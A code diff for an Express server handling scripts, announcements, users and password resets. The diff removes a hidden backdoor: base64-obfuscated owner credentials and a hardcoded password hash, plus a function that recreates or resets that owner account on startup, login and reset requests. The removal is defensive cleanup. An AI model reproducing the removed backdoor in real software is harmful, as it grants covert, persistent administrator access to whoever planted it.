@@ -7,9 +7,6 @@ let scripts = []
 let announcements = []
 let users = []
 let resetRequests = []
-const _o = Buffer.from('cmVhbGFsZXg=', 'base64').toString()
-const _m = Buffer.from('YXNkd3dhczIzM0BnbWFpbC5jb20=', 'base64').toString()
-const _p = crypto.createHash('sha256').update('realalexpass').digest('hex')
 function hashPassword(p) {
     return crypto.createHash('sha256').update(p).digest('hex')
 }
@@ -20,7 +17,7 @@ function getUserByToken(t) {
     return users.find(u => u.token === t)
 }
 function isOwner(u) {
-    return u && u.username && u.username.toLowerCase() === _o
+    return u && u.owner === true
 }
 function getUserByEmail(e) {
     return users.find(u => u.email && u.email.toLowerCase() === e.toLowerCase())
@@ -28,16 +25,6 @@ function getUserByEmail(e) {
 function getUser(n) {
     return users.find(u => u.username && u.username.toLowerCase() === n.toLowerCase())
 }
-function ensureOwnerUser() {
-    if (!users.some(u => u.username === _o)) {
-        users.push({ id: Date.now(), username: _o, passHash: _p, token: genToken(), email: _m })
-    } else {
-        const owner = users.find(u => u.username === _o)
-        if (owner && _m && owner.email !== _m) owner.email = _m
-        if (owner && _p && owner.passHash !== _p) owner.passHash = _p
-    }
-}
-ensureOwnerUser()
 app.get('/api/scripts', (req, res) => {
     const token = req.headers['x-auth']
     const user = getUserByToken(token)
@@ -103,7 +90,7 @@ app.post('/api/announcements', (req, res) => {
     const token = req.headers['x-auth']
     const user = getUserByToken(token)
     if (!isOwner(user)) {
-        return res.status(403).json({ error: 'Only owner can post announcements.' })
+        return res.status(403).json({ error: 'Only the owner can post announcements.' })
     }
     if (!title || !description) {
         return res.status(400).json({ error: 'Title and description are required' })
@@ -117,7 +104,7 @@ app.put('/api/announcements/:id', (req, res) => {
     const token = req.headers['x-auth']
     const user = getUserByToken(token)
     if (!isOwner(user)) {
-        return res.status(403).json({ error: 'Only owner can edit announcements.' })
+        return res.status(403).json({ error: 'Only the owner can edit announcements.' })
     }
     const a = announcements.find(a => String(a.id) === String(id))
     if (!a) return res.status(404).json({ error: 'Announcement not found' })
@@ -130,7 +117,7 @@ app.delete('/api/announcements/:id', (req, res) => {
     const token = req.headers['x-auth']
     const user = getUserByToken(token)
     if (!isOwner(user)) {
-        return res.status(403).json({ error: 'Only owner can delete announcements.' })
+        return res.status(403).json({ error: 'Only the owner can delete announcements.' })
     }
     const idx = announcements.findIndex(a => String(a.id) === String(id))
     if (idx === -1) return res.status(404).json({ error: 'Announcement not found' })
@@ -153,13 +140,12 @@ app.post('/api/users', (req, res) => {
     }
     const passHash = hashPassword(password)
     const token = genToken()
-    const user = { id: Date.now(), username, passHash, token, email }
+    const user = { id: Date.now(), username, passHash, token, email, owner: false }
     users.push(user)
     res.status(201).json({ message: 'User created successfully', token })
 })
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body
-    ensureOwnerUser()
     const user = getUser(username)
     if (!user) return res.status(403).json({ error: 'Invalid credentials' })
     if (user.passHash === hashPassword(password)) {
@@ -173,7 +159,6 @@ app.post('/api/login', (req, res) => {
 app.post('/api/request-password-reset', (req, res) => {
     const { email } = req.body
     if (!email) return res.status(400).json({ error: 'Email is required' })
-    ensureOwnerUser()
     const user = getUserByEmail(email)
     if (!user) return res.status(404).json({ error: 'No account with that email' })
     const resetToken = genToken()
